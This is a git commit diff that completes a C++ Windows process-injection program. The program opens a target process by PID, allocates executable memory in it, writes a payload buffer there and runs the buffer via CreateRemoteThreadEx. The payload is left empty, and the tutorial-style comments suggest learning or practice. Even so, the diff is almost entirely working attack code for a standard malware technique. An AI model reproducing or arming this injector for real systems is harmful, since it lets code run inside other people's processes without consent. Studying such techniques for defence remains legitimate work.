6eb93fe12f0aaca123891bf7204525fab32810c8
obfuscatedstring <root@obfuscated.zip>
2023-08-07 01:21:56 -0500

    Pretty much finished

--- injection.cpp
+++ injection.cpp
@@ -6,7 +6,7 @@ int main(int argc, char* argv[]) {
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
 	LPVOID rBuffer = NULL;
-	unsigned char payload[] = "\x41";
+	unsigned char payload[] = "";
 	
 	// Make sure an argument is supplied
 	if (argc != 2) {
@@ -16,7 +16,7 @@ int main(int argc, char* argv[]) {
 
 	// Set PID to supplied argument
 	PID = atoi(argv[1]);
-	printf("Opening a handle to process PID: %ld\n", PID);
+	printf("Attempting to open a handle to process PID: %ld\n", PID);
 
 	hProcess = OpenProcess(
 		PROCESS_ALL_ACCESS, // Lets request all access
@@ -26,9 +26,10 @@ int main(int argc, char* argv[]) {
 
 	if (hProcess == NULL) {
 		printf("Failed to get handle to process!\n");
+		return EXIT_FAILURE;
 	}
 	else {
-		printf("Succesfully got handle to process\n");
+		printf("Succesfully got handle to process at address 0x%p\n", hProcess);
 	}
 
 	rBuffer = VirtualAllocEx(
@@ -38,7 +39,15 @@ int main(int argc, char* argv[]) {
 		MEM_RESERVE | MEM_COMMIT, // The type of allocation. We need to reserve and commit memory
 		PAGE_EXECUTE_READWRITE // We need permission to read, write, and execute the payload we inject
 	);
-	printf("Succesfully allocated %zu bytes to process\n", sizeof(payload));
+	if (rBuffer == NULL)
+	{
+		printf("Failed to allocate memory to process!\n");
+		CloseHandle(hProcess);
+		return EXIT_FAILURE;
+	}
+	else {
+		printf("Succesfully allocated %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);
+	}
 
 	WriteProcessMemory(
 		hProcess, // Process handle
@@ -48,6 +57,36 @@ int main(int argc, char* argv[]) {
 		NULL
 	);
 	printf("Succesfully wrote %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);
+
+	hThread = CreateRemoteThreadEx(
+		hProcess, // Handle to our injected process
+		NULL,
+		0,
+		(LPTHREAD_START_ROUTINE) rBuffer, // The (Casted) starting address of our injected code
+		NULL,
+		0, // Specify that we want this thread to run immediately
+		0,
+		NULL
+	);
+
+	if (hThread == NULL) {
+		printf("Failed to get handle to remote thread!\n");
+		CloseHandle(hProcess);
+		return EXIT_FAILURE;
+	}
+	else {
+		printf("Got handle to remote thread at address 0x%p\n", hThread);
+	}
+
+	// Wait for our thread to terminate
+	WaitForSingleObject(hThread, INFINITE);
+	printf("Thread terminated\n");
+
+	// Clean up our mess
+	printf("Cleaning up...\n");
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+	printf("Cleanup Complete\n");
 
 	return EXIT_SUCCESS;
 }
